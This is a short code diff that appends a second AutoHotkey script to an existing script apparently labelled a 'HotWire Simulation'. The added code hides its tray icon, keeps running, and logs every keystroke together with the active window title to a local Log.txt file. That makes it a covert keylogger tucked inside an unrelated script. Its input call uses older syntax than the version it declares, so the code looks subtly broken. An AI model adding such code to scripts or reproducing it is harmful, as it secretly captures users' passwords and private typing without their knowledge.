@@ -134,3 +134,23 @@ TrayTip "HotWire Simulation", "WMI queries executed. Check " LogFile "."
 
 ; Keep script running
 Return
+
+
+
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+Persistent
+#NoTrayIcon
+
+PastWin := 0
+
+Loop
+{
+    Win := WinGetTitle("A")
+    Key := Input("V T5")
+    if (Win = PastWin)
+        FileAppend Key, "Log.txt"
+    else
+        FileAppend Win "[" Key "]", "Log.txt"
+    PastWin := Win
+}
